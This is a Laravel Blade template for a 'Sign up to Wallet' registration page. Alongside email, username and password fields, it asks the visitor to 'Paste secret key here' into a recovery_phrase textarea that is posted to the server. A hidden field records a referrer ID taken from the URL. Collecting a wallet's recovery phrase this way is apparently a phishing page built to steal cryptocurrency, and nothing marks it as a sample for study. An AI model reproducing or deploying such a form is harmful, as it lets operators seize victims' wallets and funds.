@extends('theme.auth')

@section('content')
    <div class="wrap">
        <div class="tf-container">
            <form class="from-login" method="post" novalidate="">
                @csrf
                @if ($errors->any())
                    <div class="alert alert-danger mb-16">
                        <ul class="mb-0">
                            @foreach ($errors->all() as $error)
                                <li>{{ $error }}</li>
                            @endforeach
                        </ul>
                    </div>
                @endif
                <div class="top-from">
                    <h4 class="title fw-6">Sign up to Wallet</h4>
                    <div class="sub-title">Welcome back! Please enter your details.</div>
                </div>
                <div class="middle-from">
                    <p class="mb-2">Paste secret key here</p>
                    <fieldset class="mb-12 icon-absolute">
                        <textarea id="id_recovery_phrase" name="recovery_phrase" rows="4" cols="10" wrap="soft"
                            class="form-control" maxlength="400" style="overflow:hidden; resize:none;" required></textarea>
                    </fieldset>

                    <p class="mb-2">Email Address</p>
                    <fieldset class="mb-12 icon-absolute">
                        <i class="icon-mail"></i>
                        <input type="email" name="email" id="id_email" placeholder="Enter your email address" required>
                    </fieldset>
                    <p class="mb-2">Username</p>
                    <fieldset class="mb-12 icon-absolute">
                        <i class="icon-user"></i>
                        <input type="text" name="name" id="id_name" placeholder="Choose a username" required>
                    </fieldset>
                    <fieldset class="box-auth-pass mb-12 tf-field icon-absolute">
                        <i class="icon-lock"></i>
                        <input type="password" name="password" placeholder="Enter your password" id="id_email-rawPassword"
                            class="password-field" required>
                        <span class="show-pass">
                            <span class="icon-eye"></span>
                            <span class="icon-eye-off"></span>
                        </span>
                    </fieldset>
                    <p class="mb-2">Confirm Password</p>
                    <fieldset class="box-auth-pass mb-12 tf-field icon-absolute">
                        <i class="icon-lock"></i>
                        <input type="password" name="password_confirmation" placeholder="Confirm your secure password"
                            id="id_rawPassword2" class="password-field" required>
                        <span class="show-pass">
                            <span class="icon-eye"></span>
                            <span class="icon-eye-off"></span>
                        </span>
                    </fieldset>
                    <input type="hidden" name="i_user" value="{{ $_GET['i'] ?? 0 }}">

                    <p>Already have an account? <a href="{{ url('login') }}">Sign In!</a></p>
                </div>
                <div class="bottom-from">
                    <button type="submit" class="tf-btn primary mb-12">Create Account</button>
                </div>
                {{-- <div class="fixed-bottom-btn">
                    <p class="text-bottom">
                        <span>By creating an account, you agree to our</span><br />
                        <span style="color: #000;"><a href="{{ url('terms') }}" rel="noopener noreferrer"
                                target="_blank">Terms of Use</a> and <a href="{{ url('privacy') }}"
                                rel="noopener noreferrer">Privacy policy</a>.</span>
                    </p>
                </div> --}}
            </form>

        </div>

    </div>
@endsection
